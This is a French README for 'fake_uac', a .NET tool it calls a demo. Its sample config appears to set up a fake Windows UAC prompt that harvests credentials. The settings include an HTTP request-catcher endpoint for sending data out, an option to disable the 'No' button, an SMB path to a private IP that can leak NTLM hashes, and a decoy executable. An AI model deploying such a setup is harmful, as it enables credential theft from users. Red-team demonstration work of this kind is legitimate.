# fake_uac

Projet de démonstration (.NET) nommé `fake_uac` — utilitaire d'exemple pour montrer des mécanismes d'application Windows (UAC) et des configurations de publication.

> Remarque : ce dépôt contient des éléments destinés à un usage de test ou d'apprentissage uniquement. Ne pas utiliser pour des activités malveillantes.

## Description

Ce projet contient une application .NET (Windows) qui illustre des comportements et des configurations pour la publication d'un exécutable autonome. Le dépôt inclut un exécutable de démonstration dans `release/` et des fichiers de test dans `test1/`.

## Contenu notable

- `release/fake_uac.exe` : exécutable produit (fourni ici à titre d'exemple).
- `test1/` : projet de test et fichiers sources (Form1.cs, Program.cs, etc.).
- `packages/` : paquets NuGet inclus localement.
- `README.md` : ce fichier.

## Fichier de configuration (exemple)

Le dépôt contient un fichier de configuration au format simple. Exemple :

```ini
[configFile]
httpEndPoint=https://exemple.requestcatcher.com/
realBinaryName=..\..\Windows\System32\calc.exe
disableNoButton=no
pubKey=O0wsjvu9M97ILDf1JtVWUaKsqvFwvBFX+mAVSRjYWVU=
smbRequest=\\192.168.122.1\chevalo\magie.ico
minMinute=0
maxMinute=1
```

Adapter ces valeurs selon vos besoins de test.

## Prérequis

- .NET SDK compatible (ex. .NET 6/7 pour les projets inclus)
- OS de développement : Windows si vous voulez exécuter l'exécutable produit (publication Win-x64)

## Compilation et publication

Pour publier un exécutable Windows autonome (exemple fourni) :

```bash
dotnet publish -p:PublishSingleFile=true -r win-x64 -c Release --self-contained true -p:PublishTrimmed=true
```

Cela produit un binaire publié prêt à être exécuté sur Windows x64.
